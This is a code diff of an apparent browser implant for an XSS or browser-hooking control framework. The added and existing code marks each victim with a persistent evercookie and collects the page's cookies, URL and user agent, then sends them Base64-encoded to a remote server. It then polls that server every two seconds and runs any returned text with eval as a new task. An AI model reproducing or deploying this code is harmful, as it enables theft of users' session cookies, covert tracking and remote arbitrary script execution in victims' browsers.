@@ -14,7 +14,7 @@ function sendDataBack(data,taskid)
     data['clientbasicinfo']={}
     data['clientbasicinfo']['jsurl']=this.jsurl
     data['clientbasicinfo']['clientid']=this.clientid
-    data['clientbasicinfo']['taskid']=this.taskid
+    data['clientbasicinfo']['taskid']=taskid
 
     data=Base64.encode(JSON.stringify(data))
     var retval='shit'
@@ -30,8 +30,6 @@ function sendDataBack(data,taskid)
     });
     return retval
 }
-
-this.ec = new evercookie(); 
 function setevercookie(name,value)
 {
     this.ec.evercookie_cookie(name, value)
@@ -43,22 +41,47 @@ function getevercookie(name)
     value=undefined
     return this.ec.evercookie_cookie(name, value) || this.ec.evercookie_userdata(name, value) || this.ec.evercookie_window(name, value)
 }
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+function evalcode(code){
+    eval(code)
+}
+function newuser(clientid){
+    setevercookie('steakcookie',clientid)
+    curdomaincookies=document.cookie
+    cururl=location.href
+    useragent=navigator.userAgent
+    data={'curdomaincookies':document.cookie,'cururl':cururl,'useragent':useragent}
+    sendDataBack(data,"")
+}
 
-function main()
+this.ec = new evercookie();
+async function main()
 {
     cookie=getevercookie('steakcookie')
+    
     if(cookie==undefined)
     {
-        this.clientid=makeclientid(15);
-        curdomaincookies=document.cookie
-        cururl=location.href
-        useragent=navigator.userAgent
-        data={'curdomaincookies':document.cookie,'cururl':cururl,'useragent':useragent}
-        resultjs=sendDataBack(data)
-    }
-    else
+        // New User
+        this.clientid=makeclientid(15)
+        newuser(this.clientid)
+    }else{
         this.clientid=cookie
-    //alert('clientid:'+this.clientid)
+    }
+    
+    while(1)
+    {
+        await sleep(2000)
+        result=sendDataBack("Rollback","")
+        console.log(result)
+        if(result=="Restart"){
+            newuser(this.clientid)
+        }else if(result!=""){
+            //New Task
+            setTimeout(evalcode,500,result);
+        }
+    }
 }
 
 main()
